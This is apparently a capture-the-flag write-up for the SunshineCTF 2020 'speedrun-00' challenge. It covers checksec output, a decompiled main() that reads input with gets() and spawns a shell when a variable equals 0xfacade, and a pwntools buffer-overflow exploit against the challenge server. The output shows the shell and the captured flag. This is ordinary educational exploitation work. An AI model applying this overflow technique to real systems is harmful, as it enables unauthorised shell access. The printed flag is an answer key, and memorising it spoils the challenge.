# **speedrun-00**
## Task
nc chal.2020.sunshinectf.org 30000
File: chall_00
Tag: binary exploitation 

## Solution

### Checksec 
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
* No Canary is so easy to BOF
* System 64 bit
* 
### Decompile with ghidra
```c
void main(void)
{
  char local_48 [56];
  int local_10;
  int local_c;
  
  puts("This is the only one");
  gets(local_48);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}
```

Easy challenge, just overwrite `local_c` or `local_10` with 0xfacade then challenge solves !

The `local_c` at `0x48 - 0xc` so just write that amount bytes of garbage and then `0xfacade` to overwrite the `local_c` value
Or do the same with `local_10`

 ### Exploit
 ```python
 from pwn import *
binary = context.binary = ELF('./chall_00')
payload =b'A' * (0x48-0xc)
payload += p64(0xfacade)
p = remote('chal.2020.sunshinectf.org',30000)
p.sendline(payload)
p.interactive()

 ```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_00'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done
[*] Switching to interactive mode
This is the only one
$ ls
chall_00
flag.txt
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
```